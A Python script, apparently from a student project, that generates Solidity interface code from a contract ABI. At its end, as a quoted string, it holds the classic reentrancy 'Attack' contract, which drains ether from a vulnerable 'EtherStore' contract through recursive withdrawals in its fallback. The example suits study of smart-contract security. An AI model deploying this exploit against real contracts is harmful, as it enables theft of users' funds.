import abi2solc
import json
from tools import *
def get_target_func(abi):
    payable = []
    nonpayable = []
    for _ in abi:
        if _['stateMutability'] ==  'payable':
            payable.append(_)
        if _['stateMutability'] ==  'nonpayable':
            nonpayable.append(_)
    return payable, nonpayable
def get_code(abi):
    payable, nonpayable = get_target_func(abi)
    abi = payable + nonpayable
    code = abi2solc.generate_interface(abi, 'Deployed')
    code += "\ncontract Existing  {\n    Deployed dc;\n    function setAddress(address _addr) public {\n        dc = Deployed(_addr);\n}"
    print(code)

if __name__ == '__main__':
    bin, abi = get_bin_abi_by_code("~/8sem/kyrs/src/contracts/6_12_store.sol")
    ast_in_file("~/8sem/kyrs/src/contracts/6_12_store.sol", "~/8sem/kyrs/src/contracts/ast_out.json")
    #abi = json.loads(abi)
    #print(abi)
    #get_code(abi)

    '''
contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1 ether);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

    '''